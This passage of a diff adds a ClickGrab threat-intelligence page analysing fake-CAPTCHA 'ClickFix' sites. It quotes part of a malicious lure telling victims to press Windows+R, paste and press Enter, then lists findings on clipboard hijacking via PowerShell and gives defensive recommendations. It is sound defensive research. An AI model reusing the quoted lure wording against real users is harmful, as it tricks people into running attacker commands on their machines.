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' alt='Windows Logo' style='width:25px; height:25px; vertical-align:middle;'&gt; + R &lt;/li&gt; &lt;li&gt;Press CTRL + V&lt;/li&gt; &lt;li&gt;Press Enter&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;/main&gt;... function verifyCaptcha() { &lt;p class="fkrc-im-not-a-robot fkrc-m-p fkrc-line-normal"&gt;I'</code></p>
+<h2 id="attack-pattern-reconstruction">Attack Pattern Reconstruction</h2>
+<h2 id="key-findings">Key Findings</h2>
+<ol>
+<li><strong>Prevalence</strong>: 11.1% of analyzed sites contained malicious content</li>
+<li><strong>Primary Attack Vector</strong>: Fake CAPTCHA verification leading to clipboard hijacking</li>
+<li><strong>Target Platform</strong>: Windows systems via PowerShell execution</li>
+<li><strong>Social Engineering</strong>: Sophisticated UI mimicking legitimate Google reCAPTCHA</li>
+</ol>
+<h2 id="recommendations">Recommendations</h2>
+<ol>
+<li><strong>User Education</strong>: Warn users about fake CAPTCHA verification schemes</li>
+<li><strong>Clipboard Monitoring</strong>: Implement clipboard monitoring for suspicious PowerShell commands</li>
+<li><strong>URL Filtering</strong>: Block known malicious domains identified in this analysis</li>
+<li><strong>PowerShell Execution Policy</strong>: Restrict PowerShell execution in corporate environments</li>
+</ol>
+    </div>
+
+    <footer class="article-footer">
+        <p>📊 <strong>Analysis conducted by the ClickGrab Threat Intelligence Team</strong></p>
+        <p>For questions about this analysis or to report similar threats, contact us on GitHub.</p>
+        
+        <div class="share-buttons">
+            <a href="https://twitter.com/intent/tweet?text=Emerging%20ClickGrab%20Campaign%3A%20Advanced%20Analysis%20of%202025-06-20%20Attack%20Patterns&url=https://mhaggis.github.io/ClickGrab/analysis/clickgrab-analysis-2025-06-20.html" class="share-btn-footer">Share on Twitter</a>
+            <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://mhaggis.github.io/ClickGrab/analysis/clickgrab-analysis-2025-06-20.html" class="share-btn-footer">Share on LinkedIn</a>
+        </div>
+    </footer>
+</article>
+
+        </div>
+    </main>
+
+    <footer class="site-footer">
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-logo">
+                    <span class="text-logo">CLICKGRAB</span>
+                    <p>Analyzing ClickFix and FakeCAPTCHA URLs from URLhaus</p>
+                </div>
+                <div class="footer-links">
+                    <h3>Resources</h3>
+                    <ul>
+                        <li><a href="/ClickGrab/analysis.html">Analysis</a></li>
+                        <li><a href="/ClickGrab/reports.html">Reports</a></li>
+                        <li><a href="https://urlhaus.abuse.ch/" target="_blank">URLhaus</a></li>
+                    </ul>
+                </div>
+                <div class="footer-links">
+                    <h3>Connect</h3>
+                    <ul>
+                        <li><a href="https://github.com/MHaggis/clickgrab" target="_blank">GitHub</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <p>&copy; 2025 ClickGrab Project. All rights reserved.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script src="/ClickGrab/assets/js/main.js"></script>
+    
+</body>
+</html> 
